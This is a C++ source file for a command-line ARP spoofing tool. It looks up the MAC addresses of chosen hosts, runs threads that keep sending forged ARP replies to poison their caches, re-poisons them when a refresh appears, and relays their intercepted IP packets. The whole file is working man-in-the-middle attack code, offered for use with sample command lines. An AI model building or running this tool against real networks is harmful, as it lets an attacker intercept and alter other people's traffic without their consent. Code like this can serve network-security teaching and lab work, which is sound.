#include <cstdio>
#include <thread>
#include <libnet.h>
#include "arp.h"

#define FREQUENCY 10

MacIpPair my;

void usage() {
	puts("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
	puts("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}

void send_arp_infect(pcap_t* handle, MacIpPair sender, MacIpPair target) {
	// [Reply] mac address of target_ip is my mac address
	send_arp(handle, ArpHdr::Reply, my.mac, target.ip, sender.mac, sender.ip);
}

void send_arp_thread_handler(const char* dev, MacIpPair sender, MacIpPair target) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return ;
	}

	while (true) {
		send_arp_infect(handle, sender, target);
		sleep(FREQUENCY);
	}

	pcap_close(handle);
}

void relay_ip_packet(pcap_t* handle, EthIp4Packet* in, MacIpPair target){
	int packet_len = sizeof(EthHdr) + ntohs((*in).ip_.len_);;

	u_char *packet_ = (u_char*)malloc(packet_len);
	memcpy(packet_, in, packet_len);

	printf("\t\t%d bytes\n", packet_len);

	EthIp4Packet* packet = (EthIp4Packet*) packet_;
	printf("\t\t[old] %s -> %s\n", std::string((*packet).eth_.smac_).c_str(), std::string((*packet).eth_.dmac_).c_str());
	(*packet).eth_.type_ = htons(EthHdr::Ip4);
	(*packet).eth_.smac_ = my.mac;
	(*packet).eth_.dmac_ = target.mac;
	printf("\t\t[new] %s -> %s\n", std::string((*packet).eth_.smac_).c_str(), std::string((*packet).eth_.dmac_).c_str());

	int res = pcap_sendpacket(handle, packet_, packet_len);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	free(packet_);
}

bool is_arp_refreshed(EthArpPacket* packet) {
	if ((*packet).arp_.op_ == htons(ArpHdr::Request))
		if ((*packet).arp_.tip_ == Ip(htonl(my.ip))) return false;
	return true;
}

void clear_lines(int lines) {
	for (int i = 0; i < lines; i++)
		printf("\033[1A\r                                                                           \r");
}

int main(int argc, char* argv[]) {
	if ((argc < 4) || (argc%2 != 0)) {
		usage();
		return -1;
	}

	int target_cnt = (argc - 2)/2;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// get my ip, mac
	my.ip = get_my_ip(dev);
	my.mac = get_my_mac(dev);

	printf("My IP  : %s\n", std::string(my.ip).c_str());
	printf("My Mac : %s\n", std::string(my.mac).c_str());

	MacIpPair sender[target_cnt];
	MacIpPair target[target_cnt];

	// get mac-ip pair
	for (int i = 0; i < target_cnt; i++) {
		EthArpPacket packet;

		sender[i].ip = Ip(argv[2*(i+1)]);
		target[i].ip = Ip(argv[2*(i+1)+1]);

		printf("[Arp Request] Sender mac addresss (%s)\n", std::string(sender[i].ip).c_str());		
		send_arp(handle, ArpHdr::Request, my.mac, my.ip, Mac(MAC_BROADCAST), sender[i].ip);
		packet = receive_arp(handle, sender[i].ip);
		sender[i].mac = Mac(packet.arp_.smac_);
		printf("\t[Sender Mac] %s\n", std::string(sender[i].mac).c_str());

		printf("[Arp Request] Target mac addresss (%s)\n", std::string(target[i].ip).c_str());		
		send_arp(handle, ArpHdr::Request, my.mac, my.ip, Mac(MAC_BROADCAST), target[i].ip);
		packet = receive_arp(handle, target[i].ip);
		target[i].mac = Mac(packet.arp_.smac_);
		printf("\t[Target Mac] %s\n", std::string(target[i].mac).c_str());
	}

	// infect arp frequently
	for (int i = 0; i < target_cnt; i++) {
		printf("[Thread] deploying worker for arp infection of %d\n", i);
		std::thread thread_arp_spoofing(
			send_arp_thread_handler, dev, sender[i], target[i]);
		thread_arp_spoofing.detach();
	}

	puts("[Listen] listening for packet.");
	// relay
	u_int64_t cnt = 0;
	while (true) {
		EthHdr* header;
		struct pcap_pkthdr* header_;
    	const u_char* packet_;
    	int res = pcap_next_ex(handle, &header_, &packet_);
    	if (res == 0) continue;
    	if (res == -1 || res == -2) break;
    
    	header = (EthHdr*) packet_;

		for (int i = 0; i < target_cnt; i++) {
			if (memcmp((*header).smac_, sender[i].mac, 6)) continue;
			
			if ((*header).type_ == htons(EthHdr::Arp)) {
				cnt++;
				puts("[Arp packet captured]");
				EthArpPacket* packet = (EthArpPacket*) packet_;

    			if ((is_arp_refreshed(packet)) ||
					((*packet).arp_.sip_ == Ip(htonl(target[i].ip))) ||
					(!memcmp((*packet).arp_.smac_, sender[i].mac, 6))) 
				{
					printf("\t[Arp] Infecting %d ...\n", i);
					send_arp_infect(handle, sender[i], target[i]);
					puts("\t[Arp] Done.");
					continue;
				}
			}
			if ((*header).type_ == htons(EthHdr::Ip4)) {
				printf("[%ld packets]\n", ++cnt);
				puts("[Ip packet captured]");
				EthIp4Packet* packet = (EthIp4Packet*) packet_;

				puts("\t[Relay] ");
				relay_ip_packet(handle, packet, target[i]);
				puts("\t[Relay] Done.");
				clear_lines(7);
			}
		}
    	
	}
	pcap_close(handle);
	return 0;
}
